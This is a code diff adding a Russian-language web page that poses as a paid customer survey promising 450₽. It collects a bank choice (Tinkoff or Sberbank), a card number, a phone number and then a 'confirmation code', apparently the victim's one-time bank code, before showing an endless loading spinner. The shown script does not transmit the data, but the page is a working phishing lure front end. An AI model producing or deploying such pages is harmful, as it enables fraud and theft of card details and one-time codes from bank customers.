@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Пройдите опрос и получите 450₽</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            max-width: 600px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .container {
+            display: none;
+            width: 100%;
+            text-align: center;
+        }
+
+        .active {
+            display: block;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        input[type="text"], select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .form-container {
+            margin-top: 20px;
+        }
+
+        .back-btn {
+            background-color: #f44336;
+            color: white;
+            padding: 8px 16px;
+            font-size: 14px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background-color: #d32f2f;
+        }
+
+        hr {
+            margin: 20px 0;
+            border: 0;
+            border-top: 1px solid #eee;
+        }
+
+        /* Стили для спиннера */
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="content">
+            <!-- Слайд 1: Приветствие -->
+            <div id="welcome-container" class="container active">
+                <h1>Добро пожаловать на сайт "Голос клиента"!</h1>
+                <p>Мы ценим ваше мнение! Ваши отзывы помогают нам улучшать качество сервиса и создавать лучший опыт для наших клиентов. Пройдите опрос и получите 450₽ в знак благодарности за ваше участие. Это займет всего несколько минут, и ваше мнение будет услышано!</p>
+                <button class="btn" onclick="goToRegistration()">Начать</button>
+            </div>
+
+            <!-- Слайд 2: Регистрация -->
+            <div class="form-container container" id="registration-container">
+                <h1>Регистрация</h1>
+                <hr>
+                <form id="registration-form">
+                    <div>
+                        <label for="bank-select">Выберите банк:</label>
+                        <select id="bank-select" required>
+                            <option value="">--Выберите банк--</option>
+                            <option value="Тинькофф">Тинькофф</option>
+                            <option value="Сбербанк">Сбербанк</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label for="card-number">Номер карты:</label>
+                        <input type="text" id="card-number" placeholder="Введите номер карты" required>
+                    </div>
+                    <div>
+                        <label for="phone-number">Номер телефона:</label>
+                        <input type="text" id="phone-number" placeholder="Введите номер телефона" required>
+                    </div>
+                    <button type="submit">Отправить</button>
+                </form>
+                <button class="back-btn" onclick="goBackToWelcome()">Назад</button>
+            </div>
+
+            <!-- Слайд 3: Подтверждение -->
+            <div class="form-container container" id="code-container">
+                <h1>Подтверждение</h1>
+                <hr>
+                <form id="code-form">
+                    <p>
+                        <label for="confirmation-code">Введите код подтверждения:</label><br>
+                        <input type="text" id="confirmation-code" placeholder="Введите код" required>
+                    </p>
+                    <button type="submit">Подтвердить</button>
+                </form>
+                <button class="back-btn" onclick="goBackToRegistration()">Назад</button>
+            </div>
+
+            <!-- Слайд 4: Ожидание -->
+            <div class="form-container container" id="loading-container">
+                <h1>Загрузка опроса</h1>
+                <hr>
+                <p>Подождите, пожалуйста, пока загружается опрос. Это может занять несколько секунд.</p>
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function goToRegistration() {
+            document.getElementById('welcome-container').classList.remove('active');
+            document.getElementById('registration-container').classList.add('active');
+        }
+
+        function goBackToWelcome() {
+            document.getElementById('registration-container').classList.remove('active');
+            document.getElementById('welcome-container').classList.add('active');
+        }
+
+        function goBackToRegistration() {
+            document.getElementById('code-container').classList.remove('active');
+            document.getElementById('registration-container').classList.add('active');
+        }
+
+        // Обработчик для отправки данных регистрации
+        document.getElementById('registration-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const bank = document.getElementById('bank-select').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+
+            if (!bank || !cardNumber || !phoneNumber) {
+                alert('Все поля обязательны для заполнения');
+                return;
+            }
+
+            // Переход к следующему слайду (подтверждение)
+            document.getElementById('registration-container').classList.remove('active');
+            document.getElementById('code-container').classList.add('active');
+        });
+
+        // Обработчик для отправки кода подтверждения
+        document.getElementById('code-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const code = document.getElementById('confirmation-code').value;
+
+            if (!code) {
+                alert('Код обязателен');
+                return;
+            }
+
+            // Переход к следующему слайду (ожидание)
+            document.getElementById('code-container').classList.remove('active');
+            document.getElementById('loading-container').classList.add('active');
+        });
+    </script>
+</body>
+</html>
